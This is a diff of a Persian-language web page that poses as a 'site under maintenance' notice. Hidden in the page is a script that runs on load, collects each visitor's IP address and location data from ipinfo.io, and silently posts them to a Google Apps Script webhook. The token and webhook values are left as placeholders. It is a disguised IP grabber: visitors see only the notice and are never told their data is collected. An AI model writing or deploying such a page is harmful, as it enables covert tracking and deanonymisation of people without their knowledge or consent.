@@ -1,33 +1,46 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <title>در حال بروزرسانی</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>در حال بارگذاری...</title>
+  <style>
+    body {
+      background-color: #f7f7f7;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      direction: rtl;
+    }
+    .box {
+      background-color: white;
+      display: inline-block;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+  </style>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding: 50px;">
-  <h2>در حال بروزرسانی سایت، لطفاً چند لحظه صبر کنید...</h2>
+<body>
+  <div class="box">
+    <h2>سایت در حال بروزرسانی است</h2>
+    <p>لطفاً بعداً دوباره مراجعه کنید.</p>
+  </div>
 
   <script>
-    fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
+    fetch("https://ipinfo.io/json?token=توکن_تو_اینجا") // 👈 توکن IPinfo
       .then(res => res.json())
       .then(data => {
-        const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // لینک Google Apps Script
-
+        const webhookUrl = "https://script.google.com/macros/s/کد_اپلیکیشن_تو/exec"; // 👈 لینک Web App گوگل
         fetch(webhookUrl, {
           method: "POST",
           body: JSON.stringify(data),
           headers: {
             "Content-Type": "application/json"
           }
-        }).then(() => {
-          // اختیاری: می‌تونی ریدایرکت کنی یا چیزی نشون بدی
-        }).catch(err => {
-          console.error("خطا در ارسال IP", err);
         });
-      }).catch(err => {
-        console.error("خطا در گرفتن IP", err);
-      });
+      })
+      .catch(err => console.log("خطا در دریافت آی‌پی", err));
   </script>
 </body>
 </html>
